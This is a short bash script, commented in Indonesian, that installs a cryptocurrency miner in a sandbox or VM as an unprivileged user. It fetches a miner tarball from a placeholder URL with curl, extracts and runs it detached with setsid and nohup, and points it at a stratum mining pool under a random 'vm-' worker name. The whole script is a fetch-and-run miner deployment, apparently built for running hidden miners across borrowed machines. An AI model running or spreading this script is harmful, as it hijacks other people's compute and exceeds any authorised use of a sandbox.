#!/usr/bin/env bash
# Pasang miner di sandbox sebagai user biasa (tanpa systemd).
# Isi variabel di bawah atau export dari .env sebelum menjalankan.
set -u

MINER_BIN="${MINER_BIN:-miner}"
MINER_TARBALL="${MINER_TARBALL:-<URL_TARBALL_MINER>}"
POOL_URL="${POOL_URL:-stratum+tcp://<POOL_HOST:PORT>}"
POOL_ADDRESS="${POOL_ADDRESS:-<ALAMAT_POOL_KAMU>}"
THREADS="${THREADS:-2}"

pkill -x "$MINER_BIN" 2>/dev/null; sleep 2
mkdir -p ~/miner/bin
B=$(find ~/miner/bin -maxdepth 2 -type f -name "$MINER_BIN" | head -1)
[ -x "$B" ] || ( cd ~/miner/bin && curl -fsSL -m 240 "$MINER_TARBALL" -o m.tgz && tar xzf m.tgz && rm -f m.tgz )
B=$(find ~/miner/bin -maxdepth 2 -type f -name "$MINER_BIN" | head -1)   # baca ulang SETELAH blok download
[ -x "$B" ] || { echo "binary tidak ada"; exit 1; }
chmod +x "$B"
cd "$(dirname "$B")" || exit 1
WORKER="vm-$(od -An -N4 -tx1 /dev/urandom | tr -d ' \n')"
setsid nohup "$B" --pool-url "$POOL_URL" --pool-worker "$WORKER" \
  --address "$POOL_ADDRESS" --threads "$THREADS" --allow-oversubscribe \
  --cpu-page-mode auto > ~/miner.log 2>&1 < /dev/null &
sleep 20
echo "worker=$WORKER proses=$(pgrep -x "$MINER_BIN" | wc -l) job=$(grep -c 'new job' ~/miner.log)"
